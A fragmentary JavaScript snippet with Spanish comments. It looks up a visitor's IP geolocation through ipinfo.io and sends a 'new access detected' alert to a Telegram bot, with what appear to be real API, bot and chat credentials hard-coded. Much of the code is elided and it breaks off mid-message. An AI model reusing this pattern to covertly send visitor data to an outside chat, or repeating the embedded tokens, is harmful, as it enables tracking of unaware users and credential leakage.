...
async function getUserDetails() {
    ...
    const geoData = await fetch('https://ipinfo.io/json?token=51072411cb9c51') // Sustituye YOUR_TOKEN por tu token de ipinfo.io
...
async function sendToTelegram(data) {
    const BOT_TOKEN = "8042550315:AAGIoWq8XT_n7KwRaxAq38-1gXvCZyAPExk"; // Reemplaza con el token de tu bot
    const CHAT_ID = "5848946481"; // Reemplaza con el chat ID

    const message = `🚨 Nuevo acceso detectado 🚨   
